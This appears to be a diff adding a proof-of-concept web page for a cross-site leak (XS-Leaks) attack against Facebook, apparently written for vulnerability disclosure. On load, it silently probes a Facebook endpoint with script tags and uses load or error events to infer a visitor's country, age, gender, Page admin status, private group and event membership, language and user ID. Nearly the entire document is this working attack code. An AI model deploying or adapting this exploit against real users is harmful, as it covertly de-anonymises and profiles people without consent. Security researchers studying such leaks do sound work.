@@ -1,0 +1,179 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Leaking a Facebook user's private information through an XSLeaks attack involving different status codes</title>	
+	<link rel="stylesheet" href="bootstrap.min.css">
+	<link rel="stylesheet" href="styles.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+	<script>
+		
+		const leaks = []
+		function buildLeak(id, question, success, failure, inverted) {
+			leaks.push({ id, question, success, failure, inverted })
+		}
+
+		const leakable = [	
+			{
+				id: '107276150654368',
+				question: function(id) { return 'Is the user\'s country Brazil?'},
+				success: 'User\'s country is Brazil',
+				failure: 'User\'s country is not Brazil',
+				inverted: false
+			},
+			{
+				id: '107276330654350',
+				question: function(id) { return 'Is the user\'s country the United States?'},
+				success: 'User\'s country is the United States',
+				failure: 'User\'s country is not United States',
+				inverted: false
+			},	
+			{
+				id: '107289783986338',
+				question: function(id) { return 'Is the user 17 years old?'},
+				success: 'User is 17 years old',
+				failure: 'User is not 17 years old',
+				inverted: false
+			},
+			{
+				id: '107284120653571',
+				question: function(id) { return 'Is the user 16 years old?'},
+				success: 'User is 16 years old',
+				failure: 'User is not 16 years old',
+				inverted: false
+			},
+			{
+				id: '107262447322405',
+				question: function(id) { return `Is user adminstrator of Page ID ${id}?`},
+				success: 'User is the adminstrator of the Page',
+				failure: 'User is not the adminstrator of the Page',
+				inverted: true
+			},
+			{
+				id: '107047417344466',
+				question: function(id) { return `Is user adminstrator of Page ID ${id}?`},
+				success: 'User is the adminstrator of the Page',
+				failure: 'User is not the adminstrator of the Page',
+				inverted: true
+			},
+			{
+				id: '107273860654597',
+				question: function(id) { return `Is the user "Male"? `},
+				success: 'Yes, the user is \"Male\"',
+				failure: 'No, the user is \"Female\"',
+				inverted: false
+			},
+			{
+				id: '916817118718568',
+				question: function(id) { return `Is user a member in the private event with ID ${id}? `},
+				success: 'User is in the private event',
+				failure: 'User is not in the private event',
+				inverted: false
+			},
+			{
+				id: '2372753592995805',
+				question: function(id) { return `Is user a member in the private event with ID ${id}? `},
+				success: 'User is in the private event',
+				failure: 'User is not in the private event',
+				inverted: false
+			},
+			{
+				id: '374079856841401',
+				question: function(id) { return `Is user a member of the private group with ID ${id}? `},
+				success: 'User is member of the secret group',
+				failure: 'User is not member of the secret group',
+				inverted: false
+			},
+			{
+				id: '928392810830163',
+				question: function(id) { return `Is user a member of the private group with ID ${id}? `},
+				success: 'User is member of the private group',
+				failure: 'User is not member of the private group',
+				inverted: false
+			},
+			{
+				id: '100041005852457',
+				question: function(id) { return `Does the user accessing have ID ${id}?`},
+				success: 'User ID does match',
+				failure: 'User ID does not match',
+				inverted: true
+			},
+			{
+				id: '100040257734979',
+				question: function(id) { return `Does the user accessing have ID ${id}?`},
+				success: 'User ID does match',
+				failure: 'User ID does not match',
+				inverted: true
+			},
+			{
+				id: '107275707321079',
+				question: function(id) { return 'Is the user\'s language set as English?'},
+				success: 'Language is set as English',
+				failure: 'Language is not set as English',
+				inverted: false
+			},
+			{
+				id: '107284383986878',
+				question: function(id) { return 'Is the user\'s language set as French?'},
+				success: 'Language is set as French',
+				failure: 'Language is not set as English',
+				inverted: false
+			}					
+		]
+
+		for (let leak of leakable) {
+			const { id, question, success, failure, inverted } = leak
+			buildLeak(id, question(id), success, failure, inverted)
+		}
+
+		onload = () => {
+			const { id, question, success, failure, inverted } = leaks.shift()
+			checkReport(id, question, success, failure, inverted);
+		}
+
+
+	    checkReport = (id, question, success, failure, inverted) => {
+	        let script = document.createElement("script");
+	        script.src = `https://mbasic.facebook.com/rapid_report/?context={"reportable_ent_token":${id}}`;
+	        
+	        script.onload = () => {
+	           	showResult(true, id, question, success, failure, inverted);
+	        }
+
+	        script.onerror = () => {
+	        	showResult(false, id, question, success, failure, inverted);
+	    
+	        }
+	        document.body.appendChild(script);
+	    }
+
+	
+	    showResult = (result, id, question, success, failure, inverted) => {
+	    
+	   		document.getElementById("knownHandler").innerHTML += `${ question } ${ !inverted ? (result ? '<span style="color:green;">' + success + '</span>' : '<span style="color:red;">' + failure + '</span>') : (result ? '<span style="color:red;">' + failure + '</span>' : '<span style="color:green;">' + success + '</span>') }</br></br>`;
+
+	        if (leaks.length != 0) {
+	        	const { id, question, success, failure, inverted } = leaks.shift()
+				checkReport(id, question, success, failure, inverted);
+	        }
+	    }
+	</script>
+</head>
+
+<body>
+    <div class="container">
+	    <section>
+			<div class="row">
+			    <div class="span16">
+			    	<div class="page-header">
+				        <h1>Leaking a Facebook user's private information</h1>
+				    </div>
+			      	</br>
+			        <h3 style="color: white;">Automatic result:</h3>
+			        <div id="knownHandler" class="outputStatus"></div>
+			    </div>
+			</div>
+		</section>
+	</div>
+</body>
+</html>
